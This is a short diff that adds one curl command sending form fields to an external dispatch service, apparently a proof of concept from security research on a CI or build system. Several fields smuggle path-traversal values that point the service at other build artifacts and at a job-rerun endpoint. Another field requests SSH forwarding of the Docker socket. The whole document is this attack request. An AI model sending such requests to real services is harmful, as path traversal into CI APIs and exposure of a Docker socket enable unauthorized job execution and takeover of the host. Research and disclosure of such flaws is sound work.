@@ -1,0 +1,14 @@
+curl \
+  -F "account=../../api/buildjobs/8cpmkt00kmh8jp5h/artifacts/temperature_converter_example%2Fpayload.json?stream=true#" \
+  -F "project=libssh2-ethicalhacking" \
+  -F "buildid=1337" \
+  -F "base=main" \
+  -F "hash=id" \
+  -F "repo=../repos/STRUCTiX/libssh2-ethicalhacking/actions/jobs/10239701797/rerun#" \
+  -F "ssh_host=127.0.0.1" \
+  -F "ssh_port=22" \
+  -F "ssh_user=test" \
+  -F "ssh_forward=127.0.0.1:22 127.0.0.1:22,127.0.0.1:2375 /var/run/docker.sock" \
+  -F "ssh_hostkey=asdf" \
+  -F "ssh_privkey=asdfasdfasdfasdfasdfasdfasdfasdfasdfasdf" \
+  -s 'https://dispatchoriginal.schoff.it'
